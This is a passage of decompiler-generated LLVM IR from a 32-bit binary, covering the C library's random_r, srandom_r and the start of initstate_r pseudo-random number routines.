  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_804b227 = add i32 %tmp3, 12
  %v2_804b227 = inttoptr i32 %v1_804b227 to i32*
  %v3_804b227 = load i32, i32* %v2_804b227, align 4
  store i32 %v3_804b227, i32* %ecx.global-to-local, align 4
  %v1_804b22a = add i32 %arg1, 4
  store i32 %v1_804b22a, i32* %esi.global-to-local, align 4
  %v1_804b22d = add i32 %tmp3, 8
  %v2_804b22d = inttoptr i32 %v1_804b22d to i32*
  %v3_804b22d = load i32, i32* %v2_804b22d, align 4
  %v1_804b230 = icmp eq i32 %v3_804b227, 0
  %v1_804b232 = icmp eq i1 %v1_804b230, false
  br i1 %v1_804b232, label %dec_label_pc_804b23d, label %dec_label_pc_804b234

dec_label_pc_804b234:                             ; preds = %entry
  %v1_804b234 = add i32 %v3_804b22d, -4
  %v2_804b234 = inttoptr i32 %v1_804b234 to i32*
  store i32 0, i32* %v2_804b234, align 4
  br label %dec_label_pc_804b24d

dec_label_pc_804b23d:                             ; preds = %entry
  %v1_804b23d = add i32 %tmp3, 4
  %v2_804b23d = inttoptr i32 %v1_804b23d to i32*
  %v3_804b23d = load i32, i32* %v2_804b23d, align 4
  %v2_804b240 = sub i32 %v3_804b23d, %v3_804b22d
  %v2_804b242 = sdiv i32 %v2_804b240, 4
  %v3_804b245 = mul i32 %v2_804b242, 5
  %v2_804b248 = add i32 %v3_804b245, %v3_804b227
  store i32 %v2_804b248, i32* %eax.global-to-local, align 4
  %v2_804b24a = add i32 %v3_804b22d, -4
  %v3_804b24a = inttoptr i32 %v2_804b24a to i32*
  store i32 %v2_804b248, i32* %v3_804b24a, align 4
  br label %dec_label_pc_804b24d

dec_label_pc_804b24d:                             ; preds = %dec_label_pc_804b234, %dec_label_pc_804b23d
  %v0_804b24d = load i32, i32* %esi.global-to-local, align 4
  %v1_804b24d = add i32 %v0_804b24d, -4
  %v2_804b24d = inttoptr i32 %v1_804b24d to i32*
  %v3_804b24d = load i32, i32* %v2_804b24d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804b255 = ashr i32 %v3_804b24d, 31
  %v2_804b256 = zext i32 %v3_804b24d to i64
  %v4_804b256 = zext i32 %v1_804b255 to i64
  %v5_804b256 = mul nuw i64 %v4_804b256, 4294967296
  %v6_804b256 = or i64 %v5_804b256, %v2_804b256
  %v8_804b256 = sdiv i64 %v6_804b256, 5
  %v9_804b256 = trunc i64 %v8_804b256 to i32
  store i32 %v9_804b256, i32* %eax.global-to-local, align 4
  %v10_804b256 = srem i64 %v6_804b256, 5
  %v11_804b256 = trunc i64 %v10_804b256 to i32
  %v6_804b25b = icmp ugt i32 %v11_804b256, 4
  br i1 %v6_804b25b, label %dec_label_pc_804b29b, label %dec_label_pc_804b25d

dec_label_pc_804b25d:                             ; preds = %dec_label_pc_804b24d
  %v1_804b25d = mul i32 %v11_804b256, 4
  %v2_804b25d = add i32 %v1_804b25d, ptrtoint (i32* @global_var_8050574.64 to i32)
  %v3_804b25d = inttoptr i32 %v2_804b25d to i32*
  %v4_804b25d = load i32, i32* %v3_804b25d, align 4
  store i32 %v4_804b25d, i32* %ecx.global-to-local, align 4
  %v1_804b264 = icmp eq i32 %v11_804b256, 0
  %v2_804b266 = add i32 %v1_804b25d, ptrtoint (i32* @global_var_8050560.65 to i32)
  %v3_804b266 = inttoptr i32 %v2_804b266 to i32*
  %v4_804b266 = load i32, i32* %v3_804b266, align 4
  store i32 %v4_804b266, i32* %ebp.global-to-local, align 4
  %v1_804b26d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b26d = add i32 %v1_804b26d, 12
  %v3_804b26d = inttoptr i32 %v2_804b26d to i32*
  store i32 %v11_804b256, i32* %v3_804b26d, align 4
  %v0_804b270 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b270 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b270 = add i32 %v1_804b270, 16
  %v3_804b270 = inttoptr i32 %v2_804b270 to i32*
  store i32 %v0_804b270, i32* %v3_804b270, align 4
  %v0_804b273 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b273 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b273 = add i32 %v1_804b273, 20
  %v3_804b273 = inttoptr i32 %v2_804b273 to i32*
  store i32 %v0_804b273, i32* %v3_804b273, align 4
  br i1 %v1_804b264, label %dec_label_pc_804b28e, label %dec_label_pc_804b278

dec_label_pc_804b278:                             ; preds = %dec_label_pc_804b25d
  %v0_804b278 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b278 = add i32 %v0_804b278, -4
  %v2_804b278 = inttoptr i32 %v1_804b278 to i32*
  %v3_804b278 = load i32, i32* %v2_804b278, align 4
  %v1_804b27b = ashr i32 %v3_804b278, 31
  %v0_804b27c = load i32, i32* %edi.global-to-local, align 4
  %v2_804b27c = zext i32 %v3_804b278 to i64
  %v4_804b27c = zext i32 %v1_804b27b to i64
  %v5_804b27c = mul nuw i64 %v4_804b27c, 4294967296
  %v6_804b27c = or i64 %v5_804b27c, %v2_804b27c
  %v7_804b27c = zext i32 %v0_804b27c to i64
  %v8_804b27c = sdiv i64 %v6_804b27c, %v7_804b27c
  %v9_804b27c = trunc i64 %v8_804b27c to i32
  %v2_804b27e = mul i32 %v9_804b27c, 4
  %v3_804b27e = add i32 %v2_804b27e, %v0_804b278
  %v1_804b281 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b281 = add i32 %v1_804b281, %v9_804b27c
  store i32 %v2_804b281, i32* %eax.global-to-local, align 4
  %v1_804b283 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b283 = add i32 %v1_804b283, 4
  %v3_804b283 = inttoptr i32 %v2_804b283 to i32*
  store i32 %v3_804b27e, i32* %v3_804b283, align 4
  %v0_804b286 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b286 = ashr i32 %v0_804b286, 31
  %v0_804b287 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b287 = zext i32 %v0_804b286 to i64
  %v4_804b287 = zext i32 %v1_804b286 to i64
  %v5_804b287 = mul nuw i64 %v4_804b287, 4294967296
  %v6_804b287 = or i64 %v5_804b287, %v2_804b287
  %v7_804b287 = zext i32 %v0_804b287 to i64
  %v8_804b287 = sdiv i64 %v6_804b287, %v7_804b287
  %v9_804b287 = trunc i64 %v8_804b287 to i32
  store i32 %v9_804b287, i32* %eax.global-to-local, align 4
  %v10_804b287 = srem i64 %v6_804b287, %v7_804b287
  %v11_804b287 = trunc i64 %v10_804b287 to i32
  %v0_804b289 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b289 = mul i32 %v11_804b287, 4
  %v3_804b289 = add i32 %v2_804b289, %v0_804b289
  %v1_804b28c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b28c = inttoptr i32 %v1_804b28c to i32*
  store i32 %v3_804b289, i32* %v2_804b28c, align 4
  br label %dec_label_pc_804b28e

dec_label_pc_804b28e:                             ; preds = %dec_label_pc_804b25d, %dec_label_pc_804b278
  %v0_804b28e = load i32, i32* %esi.global-to-local, align 4
  %v1_804b28e = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b28e = mul i32 %v1_804b28e, 4
  %v3_804b28e = add i32 %v2_804b28e, %v0_804b28e
  %v1_804b291 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b291 = add i32 %v1_804b291, 24
  %v3_804b291 = inttoptr i32 %v2_804b291 to i32*
  store i32 %v3_804b28e, i32* %v3_804b291, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b296 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b296 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b296 = add i32 %v1_804b296, 8
  %v3_804b296 = inttoptr i32 %v2_804b296 to i32*
  store i32 %v0_804b296, i32* %v3_804b296, align 4
  %v0_804b2b0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b2a9

dec_label_pc_804b29b:                             ; preds = %dec_label_pc_804b24d
  %v1_804b29b = call i32 @__errno_location(i32 %v0_804b21b)
  %v1_804b2a0 = inttoptr i32 %v1_804b29b to i32*
  store i32 22, i32* %v1_804b2a0, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b2a9

dec_label_pc_804b2a9:                             ; preds = %dec_label_pc_804b28e, %dec_label_pc_804b29b
  %v0_804b2b0 = phi i32 [ %v0_804b2b0.pre, %dec_label_pc_804b28e ], [ -1, %dec_label_pc_804b29b ]
  store i32 %v0_804b21b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b2b0

; uselistorder directives
  uselistorder i32 %v11_804b256, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b2a9, { 1, 0 }
  uselistorder label %dec_label_pc_804b28e, { 1, 0 }
  uselistorder label %dec_label_pc_804b24d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804b2b4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2b4, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804b2bd = add i32 %tmp3, 12
  %v2_804b2bd = inttoptr i32 %v1_804b2bd to i32*
  %v3_804b2bd = load i32, i32* %v2_804b2bd, align 4
  %v4_804b2bd = icmp eq i32 %v3_804b2bd, 0
  %v1_804b2c1 = add i32 %tmp3, 8
  %v2_804b2c1 = inttoptr i32 %v1_804b2c1 to i32*
  %v3_804b2c1 = load i32, i32* %v2_804b2c1, align 4
  store i32 %v3_804b2c1, i32* %esi.global-to-local, align 4
  %v1_804b2c4 = icmp eq i1 %v4_804b2bd, false
  br i1 %v1_804b2c4, label %dec_label_pc_804b2dd, label %dec_label_pc_804b2c6

dec_label_pc_804b2c6:                             ; preds = %entry
  %v2_804b2c6 = inttoptr i32 %v3_804b2c1 to i32*
  %v3_804b2c6 = load i32, i32* %v2_804b2c6, align 4
  %v5_804b2c6 = mul i32 %v3_804b2c6, 1103515245
  %v1_804b2cc = add i32 %v5_804b2c6, 12345
  %v1_804b2d1 = urem i32 %v1_804b2cc, -2147483648
  store i32 %v1_804b2d1, i32* %eax.global-to-local, align 4
  store i32 %v1_804b2d1, i32* %v2_804b2c6, align 4
  %v0_804b2d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b2d8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b2d8 = inttoptr i32 %v1_804b2d8 to i32*
  store i32 %v0_804b2d8, i32* %v2_804b2d8, align 4
  br label %dec_label_pc_804b308

dec_label_pc_804b2dd:                             ; preds = %entry
  %v1_804b2dd = add i32 %tmp3, 4
  %v2_804b2dd = inttoptr i32 %v1_804b2dd to i32*
  %v3_804b2dd = load i32, i32* %v2_804b2dd, align 4
  store i32 %v3_804b2dd, i32* %ecx.global-to-local, align 4
  %v2_804b2e0 = load i32, i32* %arg1, align 4
  store i32 %v2_804b2e0, i32* %edx.global-to-local, align 4
  %v1_804b2e2 = add i32 %tmp3, 24
  %v2_804b2e2 = inttoptr i32 %v1_804b2e2 to i32*
  %v3_804b2e2 = load i32, i32* %v2_804b2e2, align 4
  store i32 %v3_804b2e2, i32* %edi.global-to-local, align 4
  %v1_804b2e5 = inttoptr i32 %v3_804b2dd to i32*
  %v2_804b2e5 = load i32, i32* %v1_804b2e5, align 4
  store i32 %v2_804b2e5, i32* %eax.global-to-local, align 4
  %v1_804b2e7 = inttoptr i32 %v2_804b2e0 to i32*
  %v2_804b2e7 = load i32, i32* %v1_804b2e7, align 4
  %v4_804b2e7 = add i32 %v2_804b2e7, %v2_804b2e5
  store i32 %v4_804b2e7, i32* %v1_804b2e7, align 4
  %v0_804b2e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b2e9 = inttoptr i32 %v0_804b2e9 to i32*
  %v2_804b2e9 = load i32, i32* %v1_804b2e9, align 4
  %v1_804b2eb = add i32 %v0_804b2e9, 4
  store i32 %v1_804b2eb, i32* %edx.global-to-local, align 4
  %v2_804b2ee = udiv i32 %v2_804b2e9, 2
  %v1_804b2f0 = load i32, i32* %edi.global-to-local, align 4
  %v7_804b2f0 = icmp ult i32 %v1_804b2eb, %v1_804b2f0
  %v1_804b2f2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b2f2 = inttoptr i32 %v1_804b2f2 to i32*
  store i32 %v2_804b2ee, i32* %v2_804b2f2, align 4
  %v0_804b2f5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b2f5 = add i32 %v0_804b2f5, 4
  store i32 %v1_804b2f5, i32* %eax.global-to-local, align 4
  br i1 %v7_804b2f0, label %dec_label_pc_804b2fe, label %dec_label_pc_804b2fa

dec_label_pc_804b2fa:                             ; preds = %dec_label_pc_804b2dd
  %v0_804b2fa = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b2fa, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b303

dec_label_pc_804b2fe:                             ; preds = %dec_label_pc_804b2dd
  %v1_804b2fe = load i32, i32* %edi.global-to-local, align 4
  %v7_804b2fe = icmp ult i32 %v1_804b2f5, %v1_804b2fe
  %v1_804b300 = icmp eq i1 %v7_804b2fe, false
  %v3_804b300 = load i32, i32* %esi.global-to-local, align 4
  %v4_804b300 = select i1 %v1_804b300, i32 %v3_804b300, i32 %v1_804b2f5
  store i32 %v4_804b300, i32* %eax.global-to-local, align 4
  %v0_804b303.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b303

dec_label_pc_804b303:                             ; preds = %dec_label_pc_804b2fa, %dec_label_pc_804b2fe
  %v0_804b303 = phi i32 [ %v0_804b2fa, %dec_label_pc_804b2fa ], [ %v0_804b303.pre, %dec_label_pc_804b2fe ]
  %v1_804b303 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b303 = inttoptr i32 %v1_804b303 to i32*
  store i32 %v0_804b303, i32* %v2_804b303, align 4
  %v0_804b305 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b305 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b305 = add i32 %v1_804b305, 4
  %v3_804b305 = inttoptr i32 %v2_804b305 to i32*
  store i32 %v0_804b305, i32* %v3_804b305, align 4
  br label %dec_label_pc_804b308

dec_label_pc_804b308:                             ; preds = %dec_label_pc_804b2c6, %dec_label_pc_804b303
  %v2_804b308 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b308, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804b2d1, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b308, { 1, 0 }
  uselistorder label %dec_label_pc_804b303, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804b30f = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804b313 = load i32, i32* @edi, align 4
  %v0_804b314 = load i32, i32* @esi, align 4
  %v0_804b315 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804b321 = add i32 %tmp14, 12
  %v2_804b321 = inttoptr i32 %v1_804b321 to i32*
  %v3_804b321 = load i32, i32* %v2_804b321, align 4
  store i32 %v3_804b321, i32* %ecx.global-to-local, align 4
  %v6_804b327 = icmp ugt i32 %v3_804b321, 4
  br i1 %v6_804b327, label %dec_label_pc_804b3a1, label %dec_label_pc_804b329

dec_label_pc_804b329:                             ; preds = %entry
  %v1_804b329 = add i32 %tmp14, 8
  %v2_804b329 = inttoptr i32 %v1_804b329 to i32*
  %v3_804b329 = load i32, i32* %v2_804b329, align 4
  store i32 %v3_804b329, i32* %ebx.global-to-local, align 4
  %v1_804b32c = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804b333 = select i1 %v1_804b32c, i32 1, i32 %arg1
  store i32 %v3_804b333, i32* %edx.global-to-local, align 4
  %v1_804b336 = icmp eq i32 %v3_804b321, 0
  %v2_804b338 = inttoptr i32 %v3_804b329 to i32*
  store i32 %v3_804b333, i32* %v2_804b338, align 4
  br i1 %v1_804b336, label %dec_label_pc_804b39f, label %dec_label_pc_804b33c

dec_label_pc_804b33c:                             ; preds = %dec_label_pc_804b329
  %v0_804b33c = load i32, i32* @esi, align 4
  %v1_804b33c = add i32 %v0_804b33c, 16
  %v2_804b33c = inttoptr i32 %v1_804b33c to i32*
  %v3_804b33c = load i32, i32* %v2_804b33c, align 4
  store i32 %v3_804b33c, i32* %eax.global-to-local, align 4
  %v0_804b33f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b33f, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_804b346 = sext i32 %v3_804b33c to i64
  store i64 %v4_804b346, i64* %stack_var_-40, align 8
  %v5_804b37c29 = icmp sgt i32 %v3_804b33c, 1
  br i1 %v5_804b37c29, label %dec_label_pc_804b34b, label %dec_label_pc_804b37e

dec_label_pc_804b34b:                             ; preds = %dec_label_pc_804b33c, %dec_label_pc_804b34b.dec_label_pc_804b34b_crit_edge
  %v0_804b373 = phi i32 [ %v0_804b373.pre, %dec_label_pc_804b34b.dec_label_pc_804b34b_crit_edge ], [ %v0_804b33f, %dec_label_pc_804b33c ]
  %v0_804b34b = load i32, i32* %edx.global-to-local, align 4
  %v1_804b352 = ashr i32 %v0_804b34b, 31
  %v2_804b353 = zext i32 %v0_804b34b to i64
  %v4_804b353 = zext i32 %v1_804b352 to i64
  %v5_804b353 = mul nuw i64 %v4_804b353, 4294967296
  %v6_804b353 = or i64 %v5_804b353, %v2_804b353
  %v8_804b353 = sdiv i64 %v6_804b353, 127773
  %v9_804b353 = trunc i64 %v8_804b353 to i32
  %v10_804b353 = srem i64 %v6_804b353, 127773
  %v3_804b359 = mul nsw i64 %v10_804b353, 16807
  %v4_804b359 = trunc i64 %v3_804b359 to i32
  %tmp24 = mul i32 %v9_804b353, -2836
  %v2_804b365 = add i32 %v4_804b359, %tmp24
  %v1_804b367 = add i32 %v2_804b365, 1
  %v6_804b367 = xor i32 %v2_804b365, -2147483648
  %v7_804b367 = xor i32 %v1_804b367, %v2_804b365
  %v8_804b367 = and i32 %v7_804b367, %v6_804b367
  %v9_804b367 = icmp slt i32 %v8_804b367, 0
  %v10_804b367 = icmp eq i32 %v1_804b367, 0
  %v11_804b367 = icmp slt i32 %v1_804b367, 0
  %v1_804b36a = add i32 %v2_804b365, 2147483647
  store i32 %v1_804b36a, i32* %eax.global-to-local, align 4
  %v3_804b370 = icmp ne i1 %v11_804b367, %v9_804b367
  %v4_804b370 = or i1 %v10_804b367, %v3_804b370
  %v7_804b370 = select i1 %v4_804b370, i32 %v1_804b36a, i32 %v2_804b365
  store i32 %v7_804b370, i32* %edx.global-to-local, align 4
  %v1_804b373 = add i32 %v0_804b373, 4
  store i32 %v1_804b373, i32* %ecx.global-to-local, align 4
  %v2_804b376 = inttoptr i32 %v1_804b373 to i32*
  store i32 %v7_804b370, i32* %v2_804b376, align 4
  %v0_804b378 = load i32, i32* @edi, align 4
  %v1_804b378 = add i32 %v0_804b378, 1
  store i32 %v1_804b378, i32* @edi, align 4
  %v3_804b379.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_804b379.pre to i32
  %v5_804b37c = icmp slt i32 %v1_804b378, %extract.t11
  br i1 %v5_804b37c, label %dec_label_pc_804b34b.dec_label_pc_804b34b_crit_edge, label %dec_label_pc_804b379.dec_label_pc_804b37e_crit_edge

dec_label_pc_804b34b.dec_label_pc_804b34b_crit_edge: ; preds = %dec_label_pc_804b34b
  %v0_804b373.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804b34b

dec_label_pc_804b379.dec_label_pc_804b37e_crit_edge: ; preds = %dec_label_pc_804b34b
  %v0_804b37e.pre = load i32, i32* @esi, align 4
  %v0_804b381.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b37e

dec_label_pc_804b37e:                             ; preds = %dec_label_pc_804b379.dec_label_pc_804b37e_crit_edge, %dec_label_pc_804b33c
  %v0_804b381 = phi i32 [ %v0_804b381.pre, %dec_label_pc_804b379.dec_label_pc_804b37e_crit_edge ], [ %v0_804b33f, %dec_label_pc_804b33c ]
  %v0_804b37e = phi i32 [ %v0_804b37e.pre, %dec_label_pc_804b379.dec_label_pc_804b37e_crit_edge ], [ %v0_804b33c, %dec_label_pc_804b33c ]
  %v1_804b37e = add i32 %v0_804b37e, 20
  %v2_804b37e = inttoptr i32 %v1_804b37e to i32*
  %v3_804b37e = load i32, i32* %v2_804b37e, align 4
  store i32 %v3_804b37e, i32* %eax.global-to-local, align 4
  %v2_804b381 = add i32 %v0_804b37e, 4
  %v3_804b381 = inttoptr i32 %v2_804b381 to i32*
  store i32 %v0_804b381, i32* %v3_804b381, align 4
  %v0_804b384 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b384 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b384 = mul i32 %v1_804b384, 4
  %v3_804b384 = add i32 %v2_804b384, %v0_804b384
  store i32 %v3_804b384, i32* %eax.global-to-local, align 4
  %v1_804b387 = load i32, i32* @esi, align 4
  %v2_804b387 = inttoptr i32 %v1_804b387 to i32*
  store i32 %v3_804b384, i32* %v2_804b387, align 4
  %v3_804b389 = load i64, i64* %stack_var_-40, align 8
  %v6_804b389 = mul nsw i64 %v3_804b389, 10
  %v7_804b389 = trunc i64 %v6_804b389 to i32
  %v2_804b38f = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b39c25 = add i32 %v7_804b389, -1
  %v9_804b39c26 = icmp slt i32 %v1_804b39c25, 0
  store i32 %v1_804b39c25, i32* @ebx, align 4
  %v1_804b39d27 = icmp eq i1 %v9_804b39c26, false
  br i1 %v1_804b39d27, label %dec_label_pc_804b38f, label %dec_label_pc_804b39f

dec_label_pc_804b38f:                             ; preds = %dec_label_pc_804b37e, %dec_label_pc_804b38f
  store i32 %v2_804b38f, i32* %eax.global-to-local, align 4
  %v0_804b394 = load i32, i32* @esi, align 4
  %v2_804b395 = inttoptr i32 %v0_804b394 to i32*
  %v3_804b395 = call i32 @__GI_random_r(i32* %v2_804b395, i32 %v2_804b38f)
  store i32 %v0_804b394, i32* %eax.global-to-local, align 4
  store i32 %v2_804b38f, i32* %edx.global-to-local, align 4
  %v0_804b39c.pre = load i32, i32* @ebx, align 4
  %v1_804b39c = add i32 %v0_804b39c.pre, -1
  %v9_804b39c = icmp slt i32 %v1_804b39c, 0
  store i32 %v1_804b39c, i32* @ebx, align 4
  %v1_804b39d = icmp eq i1 %v9_804b39c, false
  br i1 %v1_804b39d, label %dec_label_pc_804b38f, label %dec_label_pc_804b39f

dec_label_pc_804b39f:                             ; preds = %dec_label_pc_804b37e, %dec_label_pc_804b38f, %dec_label_pc_804b329
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3a1

dec_label_pc_804b3a1:                             ; preds = %entry, %dec_label_pc_804b39f
  %v0_804b3a8 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_804b39f ]
  store i32 %v0_804b315, i32* @ebx, align 4
  store i32 %v0_804b314, i32* @esi, align 4
  store i32 %v0_804b313, i32* @edi, align 4
  store i32 %v0_804b30f, i32* @ebp, align 4
  ret i32 %v0_804b3a8

; uselistorder directives
  uselistorder i32 %v1_804b39c, { 1, 0 }
  uselistorder i32 %v0_804b37e, { 1, 0 }
  uselistorder i32 %v1_804b367, { 2, 1, 0 }
  uselistorder i32 %v2_804b365, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_804b33f, { 1, 0, 2 }
  uselistorder i32 %v3_804b321, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_804b3a1, { 1, 0 }
  uselistorder label %dec_label_pc_804b39f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b38f, { 1, 0 }
  uselistorder label %dec_label_pc_804b34b, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804b3ab = load i32, i32* @esi, align 4
  %v0_804b3ac = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_804b3cd, label %dec_label_pc_804b3c1

dec_label_pc_804b3c1:                             ; preds = %entry
  %v2_804b3c1 = icmp ult i32 %arg3, 256
  %v1_804b3c8 = select i1 %v2_804b3c1, i32 5, i32 4
  store i32 %v1_804b3c8, i32* @ebx, align 4
  br label %dec_label_pc_804b3e3

dec_label_pc_804b3cd:                             ; preds = %entry
  %v6_804b3d0 = icmp ugt i32 %arg3, 31
  br i1 %v6_804b3d0, label %dec_label_pc_804b3db, label %dec_label_pc_804b3d2

dec_label_pc_804b3d2:                             ; preds = %dec_label_pc_804b3cd
  store i32 0, i32* @ebx, align 4
  %v6_804b3d7 = icmp ugt i32 %arg3, 7
  br i1 %v6_804b3d7, label %dec_label_pc_804b3e3, label %dec_label_pc_804b433

dec_label_pc_804b3db:                             ; preds = %dec_label_pc_804b3cd
  %v2_804b3db = icmp ult i32 %arg3, 64
  %v1_804b3e0 = select i1 %v2_804b3db, i32 3, i32 2
  store i32 %v1_804b3e0, i32* @ebx, align 4
  br label %dec_label_pc_804b3e3

dec_label_pc_804b3e3:                             ; preds = %dec_label_pc_804b3d2, %dec_label_pc_804b3c1, %dec_label_pc_804b3db
  %v0_804b3ed = phi i32 [ 0, %dec_label_pc_804b3d2 ], [ %v1_804b3c8, %dec_label_pc_804b3c1 ], [ %v1_804b3e0, %dec_label_pc_804b3db ]
  %v1_804b3e3 = mul nuw nsw i32 %v0_804b3ed, 4
  %v2_804b3e3 = add i32 %v1_804b3e3, ptrtoint (i32* @global_var_8050574.64 to i32)
  %v3_804b3e3 = inttoptr i32 %v2_804b3e3 to i32*
  %v4_804b3e3 = load i32, i32* %v3_804b3e3, align 4
  store i32 %v4_804b3e3, i32* %eax.global-to-local, align 4
  %v1_804b3ea = add i32 %tmp7, 4
  store i32 %v1_804b3ea, i32* @esi, align 4
  %v2_804b3ed = add i32 %v1_804b3e3, ptrtoint (i32* @global_var_8050560.65 to i32)
  %v3_804b3ed = inttoptr i32 %v2_804b3ed to i32*
  %v4_804b3ed = load i32, i32* %v3_804b3ed, align 4
  store i32 %v4_804b3ed, i32* %edx.global-to-local, align 4
  %v2_804b3f4 = add i32 %arg4, 12
  %v3_804b3f4 = inttoptr i32 %v2_804b3f4 to i32*
  store i32 %v0_804b3ed, i32* %v3_804b3f4, align 4
  %v0_804b3f7 = load i32, i32* @esi, align 4
  %v1_804b3f7 = load i32, i32* @edi, align 4
  %v2_804b3f7 = add i32 %v1_804b3f7, 8
  %v3_804b3f7 = inttoptr i32 %v2_804b3f7 to i32*
  store i32 %v0_804b3f7, i32* %v3_804b3f7, align 4
  %v0_804b3fa = load i32, i32* %eax.global-to-local, align 4
  %v1_804b3fa = load i32, i32* @edi, align 4
  %v2_804b3fa = add i32 %v1_804b3fa, 16
  %v3_804b3fa = inttoptr i32 %v2_804b3fa to i32*
  store i32 %v0_804b3fa, i32* %v3_804b3fa, align 4
  %v0_804b3fd = load i32, i32* @esi, align 4
  %v1_804b3fd = load i32, i32* %eax.global-to-local, align 4
  %v2_804b3fd = mul i32 %v1_804b3fd, 4
  %v3_804b3fd = add i32 %v2_804b3fd, %v0_804b3fd
  store i32 %v3_804b3fd, i32* %eax.global-to-local, align 4
  %v0_804b400 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b400 = load i32, i32* @edi, align 4
  %v2_804b400 = add i32 %v1_804b400, 20
  %v3_804b400 = inttoptr i32 %v2_804b400 to i32*
  store i32 %v0_804b400, i32* %v3_804b400, align 4
  %v0_804b403 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b403 = load i32, i32* @edi, align 4
  %v2_804b403 = add i32 %v1_804b403, 24
